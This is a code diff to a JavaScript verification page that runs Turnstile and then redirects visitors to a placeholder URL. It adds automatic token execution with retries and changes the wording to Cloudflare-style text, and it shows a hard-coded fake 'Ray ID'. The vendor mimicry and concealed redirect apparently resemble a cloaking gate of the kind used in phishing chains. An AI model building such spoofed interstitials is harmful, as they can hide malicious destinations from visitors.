@@ -331,10 +331,10 @@
     </div>
 
     <!-- Title -->
-    <h2 id="statusTitle">Verify you are human</h2>
+    <h2 id="statusTitle">Performing security verification</h2>
     
     <!-- Description -->
-    <p id="statusSub" class="verification-text">Please click the checkbox below to verify you are not a bot.</p>
+    <p id="statusSub" class="verification-text">This website uses a security service to protect against malicious bots. This page is displayed while the website verifies you are not a bot.</p>
 
     <!-- Spinner (visible initially) -->
     <div class="spinner-container" id="spinnerContainer">
@@ -394,6 +394,7 @@
 
   var redirectTarget = REDIRECT_URL;
   var isVerified = false;
+  var autoVerifyAttempted = false;
 
   document.getElementById('siteName').textContent = window.location.hostname;
   document.getElementById('rayId').textContent = 'a16288a3796d32c0';
@@ -464,15 +465,45 @@
     startCountdown(2);
   }
 
+  // ====== AUTO-VERIFY FUNCTION ======
+  function autoVerify() {
+    if (isVerified || autoVerifyAttempted) return;
+    autoVerifyAttempted = true;
+    
+    console.log('🔄 Attempting automatic verification...');
+    
+    if (window.turnstile) {
+      window.turnstile.execute('#turnstileContainer', {
+        callback: function(token) {
+          console.log('🔑 Auto-verification token received:', token);
+          if (token && token.length > 0) {
+            onSuccess();
+          } else {
+            console.warn('⚠️ Empty token received, retrying...');
+            autoVerifyAttempted = false;
+            setTimeout(autoVerify, 2000);
+          }
+        },
+        'error-callback': function(error) {
+          console.log('❌ Auto-verification error:', error);
+          autoVerifyAttempted = false;
+          setTimeout(autoVerify, 3000);
+        }
+      });
+      
+    } else {
+      console.log('⏳ Turnstile not ready, waiting...');
+      autoVerifyAttempted = false;
+      setTimeout(autoVerify, 500);
+    }
+  }
+
   // ====== TURNSTILE CALLBACKS ======
   window.onTurnstileVerified = function (token) {
     console.log('🔑 Turnstile token received:', token);
     
     if (token && token.length > 0 && !isVerified) {
-      // Add a small delay to ensure the user sees the checkbox tick
-      setTimeout(function() {
-        onSuccess();
-      }, 500);
+      onSuccess();
     } else if (!isVerified) {
       showError('Invalid token received.');
       if (window.turnstile) window.turnstile.reset();
@@ -486,7 +517,7 @@
     }
   };
 
-  // Render Turnstile with explicit challenge requirement
+  // Render Turnstile
   window.addEventListener('load', function () {
     console.log('📄 Page loaded, checking for Turnstile...');
     var tries = 0;
@@ -496,23 +527,15 @@
         clearInterval(interval);
         console.log('🎯 Rendering Turnstile with key:', SITE_KEY);
         
-        // Show spinner while loading
+        // Show spinner
         document.getElementById('spinnerContainer').classList.remove('hidden');
         
-        // Render Turnstile with explicit interactive mode
         window.turnstile.render('#turnstileContainer', {
           sitekey: SITE_KEY,
           callback: 'onTurnstileVerified',
           'error-callback': 'onTurnstileError',
           theme: 'dark',
-          size: 'normal',
-          'refresh-expired': 'auto',
-          'expired-callback': function() {
-            console.log('⏰ Turnstile expired, refreshing...');
-            if (window.turnstile) {
-              window.turnstile.reset();
-            }
-          }
+          size: 'normal'
         });
         
         // Hide spinner and show Turnstile after a delay
@@ -521,6 +544,9 @@
           document.getElementById('turnstileContainer').classList.add('visible');
           document.getElementById('turnstileContainer').style.display = 'flex';
           console.log('✅ Turnstile rendered and visible');
+          
+          // Auto-verify after Turnstile is visible
+          setTimeout(autoVerify, 1500);
         }, 1000);
         
       } else if (tries > 40) {
@@ -542,21 +568,15 @@
       callback: 'onTurnstileVerified',
       'error-callback': 'onTurnstileError',
       theme: 'dark',
-      size: 'normal',
-      'refresh-expired': 'auto',
-      'expired-callback': function() {
-        console.log('⏰ Turnstile expired, refreshing...');
-        if (window.turnstile) {
-          window.turnstile.reset();
-        }
-      }
+      size: 'normal'
     });
     
     setTimeout(function() {
       document.getElementById('spinnerContainer').classList.add('hidden');
       document.getElementById('turnstileContainer').classList.add('visible');
       document.getElementById('turnstileContainer').style.display = 'flex';
-      console.log('✅ Turnstile rendered and visible');
+      
+      setTimeout(autoVerify, 1500);
     }, 1000);
   }
 })();
